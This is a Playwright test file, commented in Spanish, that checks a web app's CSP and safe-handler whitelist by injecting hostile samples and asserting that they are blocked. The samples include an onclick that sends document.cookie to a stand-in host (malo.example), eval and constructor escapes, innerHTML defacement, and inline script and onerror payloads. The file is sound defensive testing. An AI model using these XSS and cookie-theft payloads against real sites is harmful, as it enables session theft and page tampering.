// (El botón del ojo es solo un icono: sin internet no hay tipografía de iconos y mide 0 px, por eso se le envía el clic con dispatchEvent.)
// Con la CSP ACTIVA y SIN 'unsafe-inline': los botones de la app (onclick="...") funcionan por el intérprete de js/safe-handlers.js,
// y un onclick / onerror / <script> inyectado NO ejecuta nada fuera de la lista permitida.
const { test, expect } = require('@playwright/test');

test.use({ bypassCSP: false, serviceWorkers: 'block' });

// Con la CSP activa el navegador avisa en consola, una vez por elemento, que NO ejecutó el atributo en línea (es esperado: lo ejecuta el intérprete).
const isInlineHandlerNotice = (t) => /inline event handler/i.test(t);
const isCspProblem = (t) => /Content Security Policy|Refused to (load|execute|connect|frame|apply|create)/i.test(t) && !isInlineHandlerNotice(t);

async function open(page) {
  const problems = [];
  const handlerErrors = [];
  page.on('console', (m) => {
    const t = m.text();
    if (isCspProblem(t)) problems.push(t);
    if (/\[manejadores\]/.test(t)) handlerErrors.push(t);
  });
  await page.route(/^https?:\/\/(?!localhost|127\.0\.0\.1)/, (r) => r.abort('failed'));
  await page.goto('/');
  await expect(page.locator('#login-username')).toBeVisible({ timeout: 15_000 });
  return { problems, handlerErrors };
}

test('un botón real de la app funciona sin unsafe-inline (ojo de la contraseña) y no hay bloqueos de la CSP', async ({ page }) => {
  const { problems, handlerErrors } = await open(page);
  const input = page.locator('#login-password');
  await expect(input).toHaveAttribute('type', 'password');
  await page.getByRole('button', { name: 'Mostrar u ocultar contraseña' }).dispatchEvent('click');
  await expect(input).toHaveAttribute('type', 'text');
  await page.getByRole('button', { name: 'Mostrar u ocultar contraseña' }).dispatchEvent('click');
  await expect(input).toHaveAttribute('type', 'password');
  expect(problems, problems.join(' | ')).toEqual([]);
  expect(handlerErrors, handlerErrors.join(' | ')).toEqual([]);
});

test('el cargador de librerías y la versión salen de archivos externos y funcionan', async ({ page }) => {
  await open(page);
  const r = await page.evaluate(() => ({ v: window.APP_VERSION, load: typeof window.loadLib, stub: typeof window.checkLoginPasswordMode, shim: typeof window.SafeHandlers, allow: window.__PX_HANDLER_ALLOW?.calls?.length }));
  expect(r.v).toMatch(/^v1\.0\.\d+$/);
  expect(r.load).toBe('function');
  expect(r.stub).toBe('function');
  expect(r.shim).toBe('object');
  expect(r.allow).toBeGreaterThan(300);
});

test('un onclick inyectado NO puede hacer fetch, leer cookies ni tocar el HTML; uno permitido sí corre', async ({ page }) => {
  const { handlerErrors } = await open(page);
  const requests = [];
  page.on('request', (rq) => { if (/malo\.example/.test(rq.url())) requests.push(rq.url()); });
  await page.evaluate(() => {
    window.__ran = [];
    const mk = (id, code) => {
      const b = document.createElement('button');
      b.id = id; b.textContent = id; b.setAttribute('onclick', code);
      document.body.appendChild(b);
    };
    mk('x-fetch', "fetch('https://malo.example/robo?c=' + document.cookie)");
    mk('x-eval', "eval('window.__ran.push(1)')");
    mk('x-html', "document.body.innerHTML = 'hackeado'");
    mk('x-ctor', "this.constructor.constructor('window.__ran.push(2)')()");
    mk('x-img', "document.body.appendChild(document.createElement('img'))");
    mk('x-ok', "window.toggleLoginPasswordVisibility()");
  });
  for (const id of ['x-fetch', 'x-eval', 'x-html', 'x-ctor', 'x-img']) await page.locator('#' + id).evaluate((el) => el.click());
  await page.waitForTimeout(300);
  expect(requests).toEqual([]);
  expect(await page.evaluate(() => window.__ran)).toEqual([]);
  await expect(page.locator('#login-username')).toBeVisible(); // el body sigue intacto
  expect(await page.locator('img[src=""], body > img').count()).toBe(0);
  expect(handlerErrors.filter((t) => /bloqueado/.test(t)).length).toBeGreaterThanOrEqual(5);
  // Lo permitido (una función que la propia app llama desde sus botones) sí se ejecuta.
  await page.locator('#x-ok').evaluate((el) => el.click());
  await expect(page.locator('#login-password')).toHaveAttribute('type', 'text');
});

test('<script> en línea y onerror inyectados no se ejecutan', async ({ page }) => {
  await open(page);
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__pwn_script = 1';
    document.body.appendChild(s);
    const d = document.createElement('div');
    d.innerHTML = '<img src="/no-existe.png" onerror="window.__pwn_img = 1">';
    document.body.appendChild(d);
  });
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => [window.__pwn_script, window.__pwn_img])).toEqual([undefined, undefined]);
});

test('los dos botones que llaman a una pantalla perezosa existen y su función global está definida', async ({ page }) => {
  await open(page);
  const names = await page.evaluate(() => ['lazyOpenNodeUsbSync', 'lazyOpenImpactDashboard', 'lazyOpenQuetzadexAdmin', 'lazyOpenNodeAdmin', 'openCalendarBooking'].map((n) => typeof window[n]));
  expect(names).toEqual(['function', 'function', 'function', 'function', 'function']);
});
